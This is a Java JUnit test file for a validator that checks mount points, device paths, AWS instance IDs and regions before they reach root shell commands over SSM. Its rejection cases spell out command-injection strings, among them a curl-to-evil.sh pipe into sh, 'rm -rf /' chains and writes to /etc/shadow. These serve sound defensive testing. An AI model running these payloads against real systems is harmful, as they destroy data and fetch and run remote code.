package com.xammer.cloud.util;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertThrows;

/**
 * These inputs reach root shell commands on customer instances via SSM, so the
 * rejection cases matter more than the acceptance cases.
 */
class RemoteCommandInputValidatorTest {

    // ── mount point ───────────────────────────────────────────────────────────

    @ParameterizedTest
    @ValueSource(strings = {
            "/data",
            "/mnt/data",
            "/var/lib/mysql",
            "/mnt/disk-1",
            "/mnt/disk_1",
            "/opt/app.v2/data"
    })
    @DisplayName("accepts plain absolute data-volume paths")
    void acceptsSafeMountPoints(String mountPoint) {
        assertEquals(mountPoint, RemoteCommandInputValidator.requireSafeMountPoint(mountPoint));
    }

    @Test
    @DisplayName("strips a single trailing slash so callers can append '/' unambiguously")
    void stripsTrailingSlash() {
        assertEquals("/data", RemoteCommandInputValidator.requireSafeMountPoint("/data/"));
    }

    @ParameterizedTest
    @ValueSource(strings = {
            "/data; curl http://evil.sh | sh",   // command chaining
            "/data && rm -rf /",                 // conjunction
            "/data | tee /etc/passwd",           // pipe
            "/data`whoami`",                     // backtick substitution
            "/data$(whoami)",                    // dollar substitution
            "/data\nrm -rf /",                   // newline injection
            "/data 'quoted'",                    // quote break-out
            "/data\"quoted\"",
            "/data\\escaped",
            "/data > /etc/shadow",               // redirection
            "/data#comment",
            "/data*",                            // glob
            "relative/path",                     // not absolute
            "../etc",                            // traversal, not absolute
            "/data/../../etc/shadow",            // traversal
            ""                                   // empty
    })
    @DisplayName("rejects shell metacharacters, traversal and relative paths")
    void rejectsUnsafeMountPoints(String mountPoint) {
        assertThrows(IllegalArgumentException.class,
                () -> RemoteCommandInputValidator.requireSafeMountPoint(mountPoint));
    }

    @Test
    @DisplayName("rejects null mount point")
    void rejectsNullMountPoint() {
        assertThrows(IllegalArgumentException.class,
                () -> RemoteCommandInputValidator.requireSafeMountPoint(null));
    }

    @Test
    @DisplayName("refuses the root filesystem, which the shrink workflow must never unmount")
    void rejectsRootFilesystem() {
        assertThrows(IllegalArgumentException.class,
                () -> RemoteCommandInputValidator.requireSafeMountPoint("/"));
    }

    @Test
    @DisplayName("rejects paths beyond the max length")
    void rejectsOverlongMountPoint() {
        String tooLong = "/" + "a".repeat(300);
        assertThrows(IllegalArgumentException.class,
                () -> RemoteCommandInputValidator.requireSafeMountPoint(tooLong));
    }

    // ── device path ───────────────────────────────────────────────────────────

    @ParameterizedTest
    @ValueSource(strings = {"/dev/xvdf", "/dev/sdb", "/dev/nvme1n1", "/dev/nvme0n1p1"})
    @DisplayName("accepts /dev block device paths")
    void acceptsSafeDevicePaths(String device) {
        assertEquals(device, RemoteCommandInputValidator.requireSafeDevicePath(device));
    }

    @ParameterizedTest
    @ValueSource(strings = {"/etc/passwd", "xvdf", "/dev/xvdf; reboot", "/dev/../etc/passwd", ""})
    @DisplayName("rejects non-device paths and injection attempts")
    void rejectsUnsafeDevicePaths(String device) {
        assertThrows(IllegalArgumentException.class,
                () -> RemoteCommandInputValidator.requireSafeDevicePath(device));
    }

    // ── identifiers ───────────────────────────────────────────────────────────

    @Test
    @DisplayName("accepts well-formed AWS identifiers")
    void acceptsValidIdentifiers() {
        assertEquals("i-0123456789abcdef0",
                RemoteCommandInputValidator.requireValidInstanceId("i-0123456789abcdef0"));
        assertEquals("vol-0123456789abcdef0",
                RemoteCommandInputValidator.requireValidVolumeId("vol-0123456789abcdef0"));
        assertEquals("ap-south-1", RemoteCommandInputValidator.requireValidRegion("ap-south-1"));
        assertEquals("us-east-1", RemoteCommandInputValidator.requireValidRegion("us-east-1"));
    }

    @ParameterizedTest
    @ValueSource(strings = {"i-nothex", "instance-1", "i-0123; rm -rf /", "vol-0123456789abcdef0", ""})
    @DisplayName("rejects malformed instance ids")
    void rejectsInvalidInstanceIds(String instanceId) {
        assertThrows(IllegalArgumentException.class,
                () -> RemoteCommandInputValidator.requireValidInstanceId(instanceId));
    }

    @ParameterizedTest
    @ValueSource(strings = {"us_east_1", "US-EAST-1", "us-east", "us-east-1; ls", ""})
    @DisplayName("rejects malformed regions")
    void rejectsInvalidRegions(String region) {
        assertThrows(IllegalArgumentException.class,
                () -> RemoteCommandInputValidator.requireValidRegion(region));
    }
}
